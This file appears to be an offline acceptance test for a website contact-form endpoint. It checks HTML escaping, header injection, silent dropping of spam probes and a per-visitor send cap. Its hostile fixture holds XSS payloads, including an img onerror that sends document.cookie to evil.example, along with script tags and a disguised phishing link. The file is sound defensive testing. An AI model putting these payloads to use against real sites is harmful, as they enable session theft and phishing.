// Offline acceptance check for the mailbox's escaping.
//
// RUN IT:   ./run-escaping-test.sh          (from this folder)
//
// Why this exists rather than a code review. From the kata:
//
//   "This is worth setting up rather than eyeballing, because it is the one
//    check here that a person reading the code reliably passes and the code
//    reliably fails: the escaping is applied to three fields out of four, or
//    to the text copy of the address and not the link copy, and reading
//    cannot see the difference."
//
// Two earlier installs of this pattern (NinjaGym, and the source build it
// came from) shipped with exactly that bug. So: transpile the REAL endpoint,
// stub ONLY the mail library so the composed mail is handed back instead of
// sent, drive a hostile submission through it, and read every tag in the
// result. Nothing about the escaping is reimplemented here, which is the
// entire point.
//
// Needs no secrets and touches no live inbox.

let handler = null;
let sent = null;
const gate = [];      // the gate table the send cap counts in (16 Oct 2026)
let gateDown = false;

globalThis.Deno = {
  serve: (h) => { handler = h; },
  env: { get: (k) => ({
    RESEND_API_KEY: 're_stub_key',
    CONTACT_TO: 'stub-destination@example.com',
    CONTACT_FROM: 'The mailbox <stub-sender@example.com>',
    SUPABASE_URL: 'https://stub.supabase.co', SUPABASE_SERVICE_ROLE_KEY: 'service-stub',
  })[k] }
};

const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts) => {
  if (String(url).includes('api.resend.com')) {
    sent = JSON.parse(opts.body);
    return { ok: true, status: 200, text: async () => 'stubbed' };
  }
  if (String(url).includes('/rest/v1/aininja_intake_gate')) {
    if (gateDown) return { ok: false, status: 500, headers: new Headers(), text: async () => 'down' };
    if (opts && opts.method === 'POST') { gate.push({ ...JSON.parse(opts.body), at: new Date().toISOString() }); return { ok: true, status: 201, text: async () => '' }; }
    const q = new URL(String(url)).searchParams; let list = gate;
    for (const col of ['door', 'ip_hash']) if (q.get(col)) list = list.filter(r => 'eq.' + r[col] === q.get(col));
    if (q.get('at')) list = list.filter(r => r.at > q.get('at').slice(3));
    return { ok: true, status: 200, headers: new Headers({ 'content-range': `0-0/${list.length}` }), text: async () => '[]' };
  }
  return realFetch(url, opts);
};

await import('./fn.mjs');

const hostile = {
  name: '<img src=x onerror=alert(1)>Mallory',
  // carries a ? and a # so a missing href escape would show up
  email: 'attacker@example.com?subject=Hacked&body=Pwned#anchor',
  subject: '<script>alert(1)</script>',
  message:
    '<a href="https://evil.example">Click here to verify your account</a>\n' +
    '<script>alert("xss")</script>\n' +
    '<span style="display:none">invisible text the owner cannot see</span>\n' +
    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">\n' +
    'Ordinary sentence so the message is long enough to skip the nonsense check entirely, which needs 120 characters.',
  website: '',
  elapsedMs: 30000,
  // the source rides in from ?src= on the link, so it is attacker-typed too
  source: '<b onmouseover=alert(1)>linkedin',
};

const res = await handler(new Request('https://x/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com' },
  body: JSON.stringify(hostile),
}));

console.log('visitor sees:', await res.text(), '(status', res.status + ')');
console.log('');
if (!sent) { console.log('FAIL: no mail was composed at all'); process.exit(1); }

const html = sent.html;
const text = sent.text;

// Every tag in the produced mail. Anything not in the allowlist was written
// by the attacker, not by the endpoint.
const MINE = new Set(['table','tr','td','hr','div','/table','/tr','/td','/div']);
const tags = [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map(m => m[1].toLowerCase());
const foreign = [...new Set(tags)].filter(t => !MINE.has(t) && !MINE.has('/' + t));

console.log('tags found in the mail :', [...new Set(tags)].join(', '));
console.log('tags I did NOT write   :', foreign.length ? foreign.join(', ') : '(none)');
console.log('');

const checks = [
  ['no foreign tags in the html', foreign.length === 0],
  // Inside a real tag only: the escaped TEXT "&lt;img ... onerror=..." is
  // inert and is exactly what we want to see.
  ['no onerror= inside a live tag', ![...html.matchAll(/<[^>]*>/g)].some(m => /onerror\s*=/i.test(m[0]))],
  ['no <script', !/<script/i.test(html)],
  ['no live href to evil.example', !/href="https:\/\/evil/i.test(html)],
  ['no mailto: link anywhere in the mail', !/mailto:/i.test(html) && !/mailto:/i.test(text)],
  ['name escaped in html', html.includes('&lt;img src=x onerror=alert(1)&gt;Mallory')],
  ['subject carries no markup at all', !/[<>]/.test(sent.subject)],
  ['subject label came from the fixed list', sent.subject.startsWith('AI Ninja Something else:')],
  ['reply_to is the visitor', sent.reply_to === hostile.email],
  ['no newline injected into subject header', !/[\r\n]/.test(sent.subject)],
  ['no newline injected into reply_to header', !/[\r\n]/.test(sent.reply_to)],
  ['destination came from the secret, not the payload', JSON.stringify(sent.to) === '["stub-destination@example.com"]'],
  ['source label came from the fixed list, not the payload', text.includes('Source: Direct, no source on the link') && !html.includes('onmouseover')],
  ['source row is present in the html', /<td[^>]*>Source<\/td>/.test(html)],
];

let bad = 0;
for (const [label, ok] of checks) {
  console.log((ok ? '  PASS  ' : '  FAIL  ') + label);
  if (!ok) bad++;
}
console.log('');
console.log('subject line sent:', JSON.stringify(sent.subject));

// ---- The gauntlet, through the REAL handler ----
//
// The kit's own test scores the function; this drives the probes through the
// endpoint and reads what the endpoint DID: a drop must answer exactly like
// an acceptance (200, ok:true), compose no mail, and write one drop line.
// The four probes are the real ones from the night of 11 to 12 Sep 2026,
// which the previous copy of the check scored 2 and let through.
console.log('');
console.log('-- the gauntlet, through the real handler');
const probes = [
  ['NBRRFThoNaJNvSWZJVOsCCbA', 'thangav.e.l.u.s.en.n.iya.ppa.n@gmail.com', 'APSCFUwhpzfBzWkcBbig'],
  ['RULMjiEseTZnzygGwZHaCA', 'bellachristie@yahoo.com', 'nQwErTyUiOpAsDf'],
  ['qaYfWZPAEqTFeOpmu', 'adea.n.ho.o.v.er@gmail.com', 'xKcVbNmAsDfG'],
  ['gDRzEkKJhuoBXBMFM', 'jmanthei@kemkrest.com', 'pLmOkNiJbUhVgY'],
];
const people = [
  ['Somchai', 'somchai.p@gmail.com', 'Interested'],
  ['McDonald', 'r.mcdonald@gmail.com', 'Call me please'],
];
const realLog = console.log;
let ipN = 0;
async function post(name, email, message, ip = '172.16.0.' + (++ipN)) {
  sent = null;
  const drops = [];
  console.log = (...a) => { if (String(a[0]).startsWith('ricktew-contact drop')) drops.push(a.join(' ')); else realLog(...a); };
  const r = await handler(new Request('https://x/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': ip },
    body: JSON.stringify({ name, email, subject: 'hours', message, website: '', elapsedMs: 30000, source: '' }),
  }));
  console.log = realLog;
  return { status: r.status, body: await r.text(), mailed: !!sent, drops };
}
for (const [name, email, message] of probes) {
  const r = await post(name, email, message);
  const ok = r.status === 200 && r.body === '{"ok":true}' && !r.mailed && r.drops.length === 1 && r.drops[0].includes('"reason":"nonsense"');
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'probe dropped like an acceptance, no mail, one drop line: ' + JSON.stringify(name));
  if (!ok) { bad++; console.log('          got', JSON.stringify(r)); }
}
for (const [name, email, message] of people) {
  const r = await post(name, email, message);
  const ok = r.status === 200 && r.mailed && r.drops.length === 0;
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'person mailed, nothing dropped: ' + JSON.stringify(name));
  if (!ok) { bad++; console.log('          got', JSON.stringify(r)); }
}
{
  // A perfect submission with no Origin header: not a browser, so a drop,
  // answered like an acceptance.
  sent = null;
  const drops = [];
  console.log = (...a) => { if (String(a[0]).startsWith('ricktew-contact drop')) drops.push(a.join(' ')); else realLog(...a); };
  const r = await handler(new Request('https://x/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Somchai', email: 'somchai.p@gmail.com', subject: 'hours', message: 'Interested', website: '', elapsedMs: 30000, source: '' }),
  }));
  console.log = realLog;
  const body = await r.text();
  const ok = r.status === 200 && body === '{"ok":true}' && !sent && drops.length === 1 && drops[0].includes('"reason":"no_origin"');
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'no Origin header: dropped like an acceptance, no mail, one drop line');
  if (!ok) { bad++; console.log('          got', JSON.stringify({ status: r.status, body, mailed: !!sent, drops })); }
}

// ---- The send cap (16 Oct 2026): five an hour per visitor, a hundred a day ----
console.log('');
console.log('-- the send cap, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  // Junk the gauntlet drops never reaches the gate, so it costs a person nothing.
  const n0 = gate.length;
  await post(...probes[0], '7.7.7.7');
  say(gate.length === n0, 'a dropped probe writes no gate row', gate.length - n0);

  const runs = [];
  for (let i = 0; i < 6; i++) runs.push(await post(...people[0], '7.7.7.7'));
  say(runs.slice(0, 5).every(r => r.mailed && r.drops.length === 0), 'one visitor: five messages in an hour are mailed', runs.slice(0, 5));
  const sixth = runs[5];
  say(sixth.status === 200 && sixth.body === '{"ok":true}' && !sixth.mailed && sixth.drops.length === 1 && sixth.drops[0].includes('"reason":"rate_visitor"') && sixth.drops[0].includes('Interested'),
    'the sixth is dropped like an acceptance, no mail, the whole message in the drop line', sixth);
  say(gate.every(r => r.door === 'mailbox' && /^[0-9a-f]{32}$/.test(r.ip_hash)) && !JSON.stringify(gate).includes('7.7.7.7'),
    'gate rows: door mailbox, a 32-character hash, never the raw IP', gate.slice(0, 2));
  const other = await post(...people[1], '6.6.6.6');
  say(other.mailed && other.drops.length === 0, 'another visitor in the same hour is still mailed', other);

  // A busy day: a hundred messages already in, from anyone.
  while (gate.length < 100) gate.push({ door: 'mailbox', ip_hash: 'f'.repeat(32), intake: '', at: new Date().toISOString() });
  const late = await post(...people[0], '5.5.5.5');
  say(!late.mailed && late.drops.length === 1 && late.drops[0].includes('"reason":"rate_day"'), 'the 101st message of the day is dropped like an acceptance', late);
  // Rows from another door never count against the mailbox.
  gate.length = 0;
  for (let i = 0; i < 120; i++) gate.push({ door: 'upload', ip_hash: 'e'.repeat(32), intake: 'x', at: new Date().toISOString() });
  const mixed = await post(...people[0], '4.4.4.4');
  say(mixed.mailed && mixed.drops.length === 0, 'upload rows in the same table do not count against the mailbox', mixed);

  gateDown = true;
  const down = await post(...people[0], '3.3.3.3');
  say(down.mailed && down.drops.length === 1 && down.drops[0].includes('"reason":"gate_unavailable"'), 'gate table down: the message is still mailed, and the log says so', down);
  gateDown = false;
}

console.log('');
console.log(bad === 0 ? 'ALL ESCAPING AND GAUNTLET CHECKS PASSED' : bad + ' CHECK(S) FAILED');
process.exit(bad === 0 ? 0 : 1);
